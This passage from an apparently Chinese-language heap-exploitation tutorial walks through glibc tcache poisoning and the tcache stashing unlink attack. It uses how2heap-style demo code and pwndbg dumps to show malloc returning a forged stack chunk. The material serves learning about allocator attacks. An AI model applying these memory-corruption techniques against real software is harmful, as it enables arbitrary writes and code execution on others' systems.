class="number">30</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">2</span>]: <span class="number">0x55ce97ce6330</span> —▸ <span class="number">0x55ce97ce62a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>就有如上的链表结构，假设我们可以溢出第一个 chunk，那么们就能修改第二个 chunk 的fd ,则我们将 chunk b 的fd 修改为栈地址,此时 tcachebins 就变成如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">In file: /pwn/tcache_poisoning.c</span><br><span class="line">   <span class="number">30</span></span><br><span class="line">   <span class="number">31</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">   <span class="number">32</span> <span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">   <span class="number">33</span>    <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">   <span class="number">34</span> b[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line"> ► <span class="number">35</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line">   <span class="number">36</span></span><br><span class="line">   <span class="number">37</span> <span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">   <span class="number">38</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line">   <span class="number">39</span></span><br><span class="line">   <span class="number">40</span> <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fff96c64620</span> —▸ <span class="number">0x7f5ea82fbfc8</span> (__exit_funcs_lock) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│ rdx  <span class="number">0x7fff96c64628</span> —▸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) ◂— endbr64</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fff96c64630</span> —▸ <span class="number">0x55ce97ce62a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fff96c64638</span> —▸ <span class="number">0x55ce97ce6330</span> —▸ <span class="number">0x7fff96c64628</span> —▸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) ◂— endbr64</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fff96c64640</span> —▸ <span class="number">0x7fff96c64740</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fff96c64648</span> ◂— <span class="number">0x6690dce44b0a5500</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│ rbp  <span class="number">0x7fff96c64650</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fff96c64658</span> —▸ <span class="number">0x7f5ea81320b3</span> (__libc_start_main+<span class="number">243</span>) ◂— mov    edi, eax</span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">55</span>ce96f65343 main+<span class="number">314</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>5ea81320b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">2</span>]: <span class="number">0x55ce97ce6330</span> —▸ <span class="number">0x7fff96c64628</span> —▸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) ◂— ...</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>我们就发现 变成了 b —&gt; &amp;stack_var ,然后我们只需 malloc 两次就能将栈地址拿到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────</span><br><span class="line">In file: /pwn/tcache_poisoning.c</span><br><span class="line">   <span class="number">36</span></span><br><span class="line">   <span class="number">37</span> <span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">   <span class="number">38</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line">   <span class="number">39</span></span><br><span class="line">   <span class="number">40</span> <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"> ► <span class="number">41</span> <span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line">   <span class="number">42</span> <span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line">   <span class="number">43</span></span><br><span class="line">   <span class="number">44</span> assert((<span class="keyword">long</span>)&amp;stack_var == (<span class="keyword">long</span>)c);</span><br><span class="line">   <span class="number">45</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="number">46</span> &#125;</span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp     <span class="number">0x7fff96c64620</span> —▸ <span class="number">0x7f5ea82fbfc8</span> (__exit_funcs_lock) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│ rax r8  <span class="number">0x7fff96c64628</span> —▸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) ◂— endbr64</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│         <span class="number">0x7fff96c64630</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│         <span class="number">0x7fff96c64638</span> —▸ <span class="number">0x55ce97ce6330</span> —▸ <span class="number">0x7fff96c64628</span> —▸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) ◂— endbr64</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│         <span class="number">0x7fff96c64640</span> —▸ <span class="number">0x7fff96c64628</span> —▸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) ◂— endbr64</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│         <span class="number">0x7fff96c64648</span> ◂— <span class="number">0x6690dce44b0a5500</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│ rbp     <span class="number">0x7fff96c64650</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│         <span class="number">0x7fff96c64658</span> —▸ <span class="number">0x7f5ea81320b3</span> (__libc_start_main+<span class="number">243</span>) ◂— mov    edi, eax</span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">55</span>ce96f653a3 main+<span class="number">410</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>5ea81320b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p c</span><br><span class="line">$<span class="number">6</span> = (<span class="keyword">intptr_t</span> *) <span class="number">0x7fff96c64628</span></span><br></pre></td></tr></table></figure><h3 id="10-tcache-stashing-unlink-attack"><a href="#10-tcache-stashing-unlink-attack" class="headerlink" title="10. tcache_stashing_unlink_attack"></a>10. tcache_stashing_unlink_attack</h3><p>tcache 上的 stashing unlink attack</p><p>当你能够覆盖victor-&gt;bk指针时，可以使用这个技术。此外，至少需要用calloc分配一个chunk。</p><p>在glibc中，将smallbin放入tcache的机制给了我们发动攻击的机会. 这种技术允许我们把libc addr写到任何我们想要的地方，并在任何需要的地方创建一个假的chunk。在这种情况下，我们将在堆栈上创建一个假的chunk.</p><p>例如此时我们在栈上伪造一个 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">22</span>     stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx stack_var</span><br><span class="line"><span class="number">0x7fffea4571c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea4571d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00007fffea4571d0</span></span><br><span class="line"><span class="number">0x7fffea4571e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea4571f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457200</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457210</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457220</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457230</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457240</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>首先让我们向 fake_chunk-&gt;bk 写一个可写的地址，以绕过 glibc 中的 bck-&gt;fd = bin。这里我们选择stack_var[2]的地址作为fake bk。之后我们可以看到*(fake_chunk-&gt;bk + 0x10)，也就是stack_var[4]在攻击后将成为libc addr</p><p>malloc 9 个chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">29</span>     <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line"><span class="number">30</span>         chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"><span class="number">31</span>     &#125;</span><br></pre></td></tr></table></figure><p>free 7 个chunk，填满 tcache</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">36</span>     <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">  <span class="number">37</span>         <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">  <span class="number">38</span>     &#125;</span><br><span class="line">  <span class="number">39</span></span><br><span class="line">► <span class="number">40</span>     <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line">  <span class="number">41</span></span><br><span class="line">  <span class="number">42</span>     <span class="comment">//last tcache bin</span></span><br><span class="line">  <span class="number">43</span>     <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>这个我们注意一下， tcache bin 的最后一个bin是  chunk_lis[1]</p><p>然后在 unsort bin 里放入两个 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">44</span>     <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line"> ► <span class="number">45</span>     <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">   <span class="number">46</span>     <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line">   <span class="number">47</span></span><br><span class="line">     ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">7</span>]: <span class="number">0x55a4674bc340</span> —▸ <span class="number">0x55a4674bc7a0</span> —▸ <span class="number">0x55a4674bc700</span> —▸ <span class="number">0x55a4674bc660</span> —▸ <span class="number">0x55a4674bc5c0</span> —▸ <span class="number">0x55a4674bc520</span> —▸ <span class="number">0x55a4674bc480</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x55a4674bc3d0</span> —▸ <span class="number">0x55a4674bc290</span> —▸ <span class="number">0x7fd3f030cbe0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x55a4674bc3d0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后分配一个大于 0x90 的chunk ，这个时候 chunk0 和 chunk2 会被放入 smallbin 里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">49</span>     <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line">  <span class="number">50</span></span><br><span class="line">  <span class="number">51</span>     <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br></pre></td></tr></table></figure><p>然后，我再 malloc 两个 chunk ，从tcache bin 取出两个 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">5</span>]: <span class="number">0x55a4674bc700</span> —▸ <span class="number">0x55a4674bc660</span> —▸ <span class="number">0x55a4674bc5c0</span> —▸ <span class="number">0x55a4674bc520</span> —▸ <span class="number">0x55a4674bc480</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0xa0</span>: <span class="number">0x55a4674bc3d0</span> —▸ <span class="number">0x55a4674bc290</span> —▸ <span class="number">0x7fd3f030cc70</span> (main_arena+<span class="number">240</span>) ◂— <span class="number">0x55a4674bc3d0</span></span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后此时，我们假设有一个漏洞能修改 chunklis[2]的 bck</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">61</span>     <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">  <span class="number">62</span>     <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">► <span class="number">63</span>     chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">  <span class="number">64</span>     <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">  <span class="number">65</span></span><br></pre></td></tr></table></figure><p>此时 bins 如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">5</span>]: <span class="number">0x55a4674bc700</span> —▸ <span class="number">0x55a4674bc660</span> —▸ <span class="number">0x55a4674bc5c0</span> —▸ <span class="number">0x55a4674bc520</span> —▸ <span class="number">0x55a4674bc480</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0xa0</span> [corrupted]</span><br><span class="line">FD: <span class="number">0x55a4674bc3d0</span> —▸ <span class="number">0x55a4674bc290</span> —▸ <span class="number">0x7fd3f030cc70</span> (main_arena+<span class="number">240</span>) ◂— <span class="number">0x55a4674bc3d0</span></span><br><span class="line">BK: <span class="number">0x55a4674bc290</span> —▸ <span class="number">0x55a4674bc3d0</span> —▸ <span class="number">0x7fffea4571c0</span> —▸ <span class="number">0x7fffea4571d0</span> ◂— <span class="number">0x0</span></span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后我们 calloc 一个新 chunk ，此时将 chunk[0] (calloc 不会从 tcache 取)</p><p>smallbin 的chunk 会被重新填充到 tache bin里，然后我们可以通过 tcache 没有严格的检查，再将 fake chunk 取出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">7</span>]: <span class="number">0x7fffea4571d0</span> —▸ <span class="number">0x55a4674bc3e0</span> —▸ <span class="number">0x55a4674bc700</span> —▸ <span class="number">0x55a4674bc660</span> —▸ <span class="number">0x55a4674bc5c0</span> —▸ <span class="number">0x55a4674bc520</span> —▸ <span class="number">0x55a4674bc480</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0xa0</span> [corrupted]</span><br><span class="line">FD: <span class="number">0x55a4674bc3d0</span> —▸ <span class="number">0x55a4674bc700</span> ◂— <span class="number">0x0</span></span><br><span class="line">BK: <span class="number">0x7fffea4571d0</span> ◂— <span class="number">0x0</span></span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">In file: /pwn/tcache_stashing_unlink_attack.c</span><br><span class="line">   <span class="number">71</span>     <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">   <span class="number">72</span></span><br><span class="line">   <span class="number">73</span>     <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">   <span class="number">74</span>     target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">   <span class="number">75</span></span><br><span class="line"> ► <span class="number">76</span>     <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line">   <span class="number">77</span></span><br><span class="line">   <span class="number">78</span>     assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">   <span class="number">79</span>     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="number">80</span> &#125;</span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp     <span class="number">0x7fffea4571b0</span> ◂— <span class="number">0x900000009</span> <span class="comment">/* &#x27;\t&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│         <span class="number">0x7fffea4571b8</span> —▸ <span class="number">0x7fffea4571d0</span> —▸ <span class="number">0x55a4674bc3e0</span> —▸ <span class="number">0x55a4674bc700</span> —▸ <span class="number">0x55a4674bc660</span> ◂— ...</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│         <span class="number">0x7fffea4571c0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│ rax r8  <span class="number">0x7fffea4571d0</span> —▸ <span class="number">0x55a4674bc3e0</span> —▸ <span class="number">0x55a4674bc700</span> —▸ <span class="number">0x55a4674bc660</span> —▸ <span class="number">0x55a4674bc5c0</span> ◂— ...</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│         <span class="number">0x7fffea4571d8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│         <span class="number">0x7fffea4571e0</span> —▸ <span class="number">0x7fd3f030cc70</span> (main_arena+<span class="number">240</span>) —▸ <span class="number">0x7fd3f030cc60</span> (main_arena+<span class="number">224</span>) —▸ <span class="number">0x7fd3f030cc50</span> (main_arena+<span class="number">208</span>) —▸ <span class="number">0x7fd3f030cc40</span> (main_arena+<span class="number">192</span>) ◂— ...</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│         <span class="number">0x7fffea4571e8</span> ◂— <span class="number">0x0</span></span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">55</span>a466c59494 main+<span class="number">619</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>d3f01480b3 __libc_start_main+<span class="number">243</span></span><br><span 